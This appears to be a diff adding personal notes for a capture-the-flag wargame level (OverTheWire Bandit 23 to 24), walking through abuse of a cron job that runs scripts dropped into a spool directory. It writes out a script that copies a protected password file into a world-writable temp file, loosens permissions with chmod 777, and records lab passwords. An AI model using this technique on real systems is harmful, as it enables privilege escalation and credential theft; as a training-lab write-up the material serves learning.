@@ -1,0 +1,54 @@
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+pass: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
+
+cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+done
+
+mktemp -d
+/tmp/tmp.PBTc2Ed0IA
+
+cd /tmp/tmp.PBTc2Ed0IA
+
+echo -e '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/tmp.PBTc2Ed0IA/pass24' > script.sh
+
+ls
+script.sh
+
+cat script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.PBTc2Ed0IA/pass24
+
+chmod +x script.sh
+
+touch pass24 && chmod 666 pass24
+chmod 777 .
+
+chmod 777 script.sh
+
+cp script.sh /var/spool/bandit24/foo/
+
+cat pass24
+hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
